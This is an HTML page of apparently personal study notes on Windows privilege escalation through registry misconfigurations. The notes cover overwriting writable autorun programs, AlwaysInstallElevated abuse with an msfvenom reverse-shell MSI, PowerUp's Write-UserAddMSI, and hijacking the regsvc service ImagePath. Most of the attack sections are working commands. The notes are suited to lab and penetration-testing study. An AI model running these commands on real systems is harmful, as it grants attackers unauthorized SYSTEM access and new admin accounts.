<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">

    <!--==================== CSS ====================-->
    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">



    <title>Methodology</title>
</head>
<body class="dark-theme">
    <!--==================== HEADER ====================-->
    <header class="header" id="header">
        <nav class="nav container">
            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
            <div class="nav__menu" id="nav-menu">
                <div class="search-bar">
                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
                <!-- <button onclick="search()" class="search-button">Search</button> -->
                <div id="searchResults" class="search-results"></div>

              </div>

            </div>
            <div class="nav__menu" id="nav-menu">
                <ul class="nav__list grid">
                    <li class="nav__item">
                        <a href="../../../../../index.html#home" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Home
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#skills" class="nav__link">
                            <i class="uil uil-file-alt nav__icon"></i> Skills
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#portfolio" class="nav__link">
                            <i class="uil uil-scenery nav__icon"></i> Portfolio
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#contact" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Contact Me
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
                            <i class="uil uil-estate nav__icon"></i> Methodology
                        </a>
                    </li>
                </ul>
                <i class="uil uil-times nav__close" id="nav-close"></i>
            </div>

            <div class="nav__btns">
                <!--Theme change button-->
                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>

                <div class="nav__toggle" id="nav-toggle">
                    <i class="uil uil-apps"></i>
                </div> -->
            </div>
        </nav>
    </header>
    <!--==================== END-HEADER ====================-->


<!--==================== MAIN ====================-->
    <main class="main"><article id="321fe939-23b1-40e1-b0fe-71c15194461c" class="page sans"><header><h1 class="page-title">Registry Exploits/Autoruns</h1><p class="page-description"></p></header><div class="page-body"><ul id="7cda1db0-46e7-44f9-9e76-df916e4bb336" class="bulleted-list"><li style="list-style-type:disc">Find things that run automatically</li></ul><ul id="6f3578c7-c6cd-4c03-b5a9-71ae669ef53e" class="bulleted-list"><li style="list-style-type:disc">see if we can escalate based off this things</li></ul><ul id="4c26448a-af3b-46e9-92bc-083320f83479" class="bulleted-list"><li style="list-style-type:disc">sys internal tools:</li></ul><ul id="74deb536-d3b7-4012-be36-df0de385d8ba" class="bulleted-list"><li style="list-style-type:disc">autorun64.exe</li></ul><ul id="704c1618-04f0-42cb-8d35-6ef3f54e21be" class="bulleted-list"><li style="list-style-type:disc">accesschk64.exe </li></ul><figure id="ebb98812-e111-4148-8a4a-848a97bc054d" class="image"><a href="Registry%20Exploits%20Autoruns%20321fe93923b140e1b0fe71c15194461c/Untitled.png"><img style="width:1308px" src="Registry%20Exploits%20Autoruns%20321fe93923b140e1b0fe71c15194461c/Untitled.png"/></a></figure><h2 id="dbc4ffd7-1ba5-4e28-99ad-4efe61608190" class="">Autoruns</h2><ul id="9588d12d-7f15-4640-af2c-5de98172f06e" class="bulleted-list"><li style="list-style-type:disc">File must have allrun access.</li></ul><p id="f93af74f-a417-4104-b099-b9ea36e8d4ec" class="">Manually:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="02efbd9a-fa02-40d6-b717-5ef69c575ed1" class="code"><code class="">#Query the registry for AutoRun executables:
reg query HKLM\Software\Policies\Microsoft\Windows\CurrentVersion\Run
#OR
reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
#OR
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
#Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
C:\accesschk.exe /accepteula -wvu &quot;C:\Program Files\Autorun Program\program.exe&quot;
#Copy the shell.exe executable you created and overwrite the AutoRun executable with it:
copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\Autorun Program\program.exe&quot; /Y
#Start nc listener and restart machine</code></pre><p id="e1648642-5fb9-4fdc-8c4d-a811186203b1" class="">Alternatively:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="71412ab7-8caf-4e28-8233-975c4c0c90a6" class="code"><code class="">#Open Autoruns64.exe from sysinternals and go to logon tab
#note the image path of the desired autorun
#Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
C:\accesschk.exe /accepteula -wvu &quot;C:\Program Files\Autorun Program\program.exe&quot;
#notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission
#replace the existing program with our malicious exe
copy program.exe &quot;C:\Program Files\Autoruns\program.exe&quot;
#Log out and back in via RDP
</code></pre><p id="6f0ca97a-5dfb-4572-ba37-97c58728628d" class=""><strong>Steps to exploit:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a791cf44-3fdb-4408-beb4-4799e27d7036" class="code"><code class="">- upload malicious exe payload to machine
- Replace the vulnerable program that we found
- disconnect and come back to the user
- Allow the program to run
- Profit</code></pre><p id="ed69af53-04c9-4e7a-99f0-d8e4052c8866" class=""><strong>Powerup find autoruns allrun access:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29c3d0cf-55a7-460b-9c0c-d5af3a78f8e1" class="code"><code class="">powershell -ep bypass

.\PowerUp.ps1

invoke-allchecks</code></pre><p id="c374ebb7-7d8e-42a3-bc8b-2b8a6e67ff44" class="">
</p><p id="69169e68-1bd8-4606-9cec-23a2fcd5b27c" class="">
</p><h2 id="67642316-9887-47e8-a995-1d1661b34b67" class=""><strong>Always install elevated:</strong></h2><ul id="53a01cf4-2fd9-4aae-a180-224d6df9d7ae" class="bulleted-list"><li style="list-style-type:disc">establish user connection</li></ul><ul id="6b42bbeb-943b-4e1e-ab13-8f6af9dd3b8d" class="bulleted-list"><li style="list-style-type:disc">check if value is set to 1 in registry</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cf96b620-1e6d-4115-bf8e-9e160056a9c7" class="code"><code class="">#Query the registry for AlwaysInstallElevated keys and see if they are set to 1 (0x1):
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
#On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f msi -o reverse.msi
#Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi</code></pre><p id="90d294ed-c9d7-4777-90a1-d23dd8742b75" class=""><strong>Easy exploit:</strong></p><ul id="f87a6bd9-5eea-4803-a8bb-25137818832d" class="bulleted-list"><li style="list-style-type:disc">in powerup run:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1fdead12-e799-4a39-8cf5-8c9892ce6961" class="code"><code class="">#Powerup found always installed elevated that we can run
Write-UserAddMSI</code></pre><ul id="c358a41b-119b-4e69-a6b4-9db04fe6502f" class="bulleted-list"><li style="list-style-type:disc">run a adduser program to add a new user as an admin</li></ul><p id="6536eaed-f71e-4983-9d23-2578d79ef42c" class="">Harder:</p><ul id="5bc70be6-3f46-41c6-a586-e921481c4dde" class="bulleted-list"><li style="list-style-type:disc">create msfvenom reverse shell payload executable and itll run as root giving you root shell.</li></ul><p id="9216e2e5-2149-4528-9478-9d743c4f92c3" class="">
</p><h2 id="38bc2033-8474-4568-b1c0-5a5daeeeb70a" class=""><strong>Registry Service Escalation: (regsvc)</strong></h2><p id="774a8d40-5f89-4ccd-9962-5ff49e6b84df" class="">getACL command Powershell:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f2e779d1-23e0-4513-aa3e-ed247dbbbc23" class="code"><code class="">powershell -ep bypass
Get-Acl -Path HKLM:\System\CurrentControlSet\services\regsvg | fl
#note that user belongs to NT AUTHORITY\INTERACTIVE and has FullControl permission over registry key
#create a malicious executable to add a new admin user
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
sc start regsvc
net localgroups administrators</code></pre><p id="521eb8f2-ee01-411c-a5ed-bc97abed00ee" class="">
</p></div></article></main></main>

    <!--==================== FOOTER ====================-->
    <footer class="footer">
        <div class="footer__bg">
            <div class="footer__container container grid">
                <div>
                    <h1 class="footer__title">Tyler O'Hare</h1>
                    <span class="footer__subtitle">Cybersecurity Engineer</span>
                </div>

                <ul class="footer__links">
                    <li>
                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
                    </li>

                    <li>
                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
                    </li>

                    <li>
                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
                    </li>
                    <li>
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
                    </li>
                </ul>

                <div class="footer__socials">
                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
                        <i class="uil uil-github-alt"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
                        <i class="uil uil-linkedin-alt"></i>
                    </a>
                </div>
            </div>

            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
        </div>

    </footer>
    <!--==================== END-FOOTER ====================-->


    <!--==================== SCROLL TOP ====================-->
    <a href="" class="scrollup" id="scroll-up">
        <i class="uil uil-arrow-up scroll__icon"></i>
    </a>

    <!--==================== SWIPER JS ====================-->
    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>

    <!--==================== MAIN JS ====================-->
    <script src="../../../../../../assets/js/main.js"></script>
    <script src="../../../../../../assets/js/search.js"></script>


</body>
</html>